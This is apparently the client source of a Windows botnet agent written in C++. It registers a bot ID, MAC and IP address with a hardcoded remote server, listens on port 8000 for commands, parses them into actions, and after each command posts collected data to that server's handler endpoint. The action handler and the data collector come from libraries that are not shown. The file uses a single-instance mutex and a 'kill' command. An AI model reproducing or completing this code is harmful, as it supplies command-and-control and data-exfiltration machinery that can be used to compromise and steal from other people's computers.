#undef UNICODE
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include "lib/HttpLib.h"
#include "lib/UtilLib.h"
#include "lib/ActionController.h"

// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")
// #pragma comment (lib, "Mswsock.lib")

#define PORT 8000
#define url "75.102.73.218"

int runServer(int portNum);
char* GetIP();

vector<string> keys = vector<string>();
vector<string> values = vector<string>();
vector<vector<string>> requestQueue;
DataCollector dc;
ActionController ac;
int WAIT = 0;
bool encode = false;

void handleAction(){
printf("doing action\n");
}

int main(void)
{
  keys.push_back("mac_address");
  keys.push_back("bot_id");
  values.push_back("00-11-22-33-44-55");
  values.push_back("DwQUW7cY1VT0IEfZ5ZzeuClmMjdai3UM");

  int res = runServer(PORT);

  return res;
}

int runServer(int portNum){
  string portStr = to_string(portNum);
  char* port = new char[portStr.size()];
  strcpy(port, portStr.c_str());
  const char* mutexName = "test";
  HANDLE mHandle = CreateMutex(NULL, true, mutexName);
  if(GetLastError() == ERROR_ALREADY_EXISTS){
    printf("Mutex already locked\n");
    return 1;
  }

  keys.push_back("ip_address");
  values.push_back(GetIP());
  keys.push_back("port");
  values.push_back(port);

  string args = getArgsToString(keys, values, getSize(keys), { "mac_address", "bot_id", "ip_address", "port" }, 4, "POST");
  char* argsChar = new char[args.size()];
  strcpy(argsChar, args.c_str());
  string response = httpPostRequest(url, "/database/api/server/status/", 50000, argsChar, args.size()).c_str();
  delete argsChar;
  printf("Res: %s\n", response.c_str());
  // removeElement(keys, values, "ip_address");
  // removeElement(keys, values, "port");

  WSADATA wsaData;
  int iResult;

  SOCKET ListenSocket = INVALID_SOCKET;
  SOCKET ClientSocket = INVALID_SOCKET;

  struct addrinfo *result = NULL;
  struct addrinfo hints;

  int iSendResult;
  char recvbuf[512];
  int recvbuflen = 512;

  // Initialize Winsock
  iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
  if (iResult != 0) {
    printf("WSAStartup failed with error: %d\n", iResult);
    return 1;
  }

  ZeroMemory(&hints, sizeof(hints));
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_protocol = IPPROTO_TCP;
  hints.ai_flags = AI_PASSIVE;

  // Resolve the server address and port
  iResult = getaddrinfo(NULL, port, &hints, &result);
  if ( iResult != 0 ) {
    printf("getaddrinfo failed with error: %d\n", iResult);
    WSACleanup();
    return 1;
  }

  // Create a SOCKET for connecting to server
  ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
  if (ListenSocket == INVALID_SOCKET) {
    printf("socket failed with error: %ld\n", WSAGetLastError());
    freeaddrinfo(result);
    WSACleanup();
    return 1;
  }

  // Setup the TCP listening socket
  iResult = bind( ListenSocket, result->ai_addr, (int)result->ai_addrlen);
  if (iResult == SOCKET_ERROR) {
    printf("bind failed with error: %d\n", WSAGetLastError());
    freeaddrinfo(result);
    closesocket(ListenSocket);
    WSACleanup();
    return 1;
  }

  freeaddrinfo(result);

  iResult = listen(ListenSocket, SOMAXCONN);
  if (iResult == SOCKET_ERROR) {
    printf("listen failed with error: %d\n", WSAGetLastError());
    closesocket(ListenSocket);
    WSACleanup();
    return 1;
  }

  bool run = true;
  // enter endless loop unless the kill command is sent
  while(run){
    // Accept a client socket
    ClientSocket = accept(ListenSocket, NULL, NULL);
    if (ClientSocket == INVALID_SOCKET) {
      printf("accept failed with error: %d\n", WSAGetLastError());
      closesocket(ListenSocket);
      WSACleanup();
      return 1;
    }
    // clear the buffer
    memset(recvbuf, 0, 512);

    // Receive until the peer shuts down the connection
    do {
      iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
      printf("got a connection\n");
      if (iResult > 0) {
        printf("data\n");
        printf("Received: %s\n", recvbuf);

        if(strcmp(recvbuf, "kill") == 0){
          // set flag to end listen loop
          run = false;
          // send something back so python can close the connection
          iSendResult = send( ClientSocket, "\0", iResult, 0 );
          // break to jump out of the reading buffer loop
          break;
        }

        string res(recvbuf);
        struct Action action = ac.parseAction(res);
    		ac.addAction(action);
    		handleAction();
    		// reqCounter++;
    		Sleep(3000);
    		// if(reqCounter % 1 == 0){
    			sendP_Request(url, portNum, "/database/api/handler/", requestQueue, dc.getPostData(), WAIT);
    			dc.dumpCollectedData();
    		// }

        // Echo the buffer back to the sender
        iSendResult = send( ClientSocket, recvbuf, iResult, 0 );
        if (iSendResult == SOCKET_ERROR) {
          printf("send failed with error: %d\n", WSAGetLastError());
          closesocket(ClientSocket);
          WSACleanup();
          return 1;
        }
        printf("Sent back: %s\n\n", recvbuf);
      }
      else if (iResult == 0){
        // do nothing, 0 will break out of the reading loop
      }else  {
        printf("recv failed with error: %d\n", WSAGetLastError());
        closesocket(ClientSocket);
        WSACleanup();
        return 1;
      }
    } while (iResult > 0);
  }// end while

  // No longer need server socket
  closesocket(ListenSocket);

  // shutdown the connection since we're done
  iResult = shutdown(ClientSocket, SD_SEND);
  if (iResult == SOCKET_ERROR) {
    printf("shutdown failed with error: %d\n", WSAGetLastError());
    closesocket(ClientSocket);
    WSACleanup();
    return 1;
  }

  // cleanup
  closesocket(ClientSocket);
  WSACleanup();
  ReleaseMutex(mHandle);
}

char* GetIP()
{
	WSAData wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	HOSTENT* Host;
	char hostname[128] = { 0 };
	char* IPv4 = new char[128];
	gethostname(hostname, 128);
	Host = gethostbyname(hostname);
	IPv4 = inet_ntoa(*(in_addr*)Host->h_addr_list[0]);
	WSACleanup();
	return IPv4;
}
